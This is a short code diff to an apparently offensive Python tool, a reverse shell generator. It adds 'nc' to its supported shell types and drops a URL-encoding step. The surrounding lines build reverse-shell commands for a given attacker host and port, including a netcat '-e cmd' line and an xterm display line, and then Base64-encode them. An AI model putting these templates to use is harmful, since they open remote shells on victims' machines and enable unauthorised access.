@@ -30,7 +30,7 @@ else:
     os.mkdir('Store_shell')     
 print (banner)
 path = ('file://'+os.getcwd()+'/'+'Store_shell')
-list_input = ['python','bash','perl','php','ruby','netcat','xterm','java','powershell','js','exe'] 
+list_input = ['python','bash','perl','php','ruby','netcat','xterm','java','powershell','js','exe','nc'] 
 if '--info' in sys.argv :
    print('[*] Getshell Support : '+'\n'+'='*22)
    for i in list_input :
@@ -87,7 +87,7 @@ class Reverse_Shell_Generator:
                      if self.args.windows:
                        self.result = "nc.exe -e cmd "+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                  self.Base64()
-                 self.URL_encode() 
+                  
             elif 'xterm' in self.args.type:
                  self.result = 'xterm -display '+f'{self.args.LHOST}'+':'+f'{self.args.LPORT}'
                  self.Base64() 
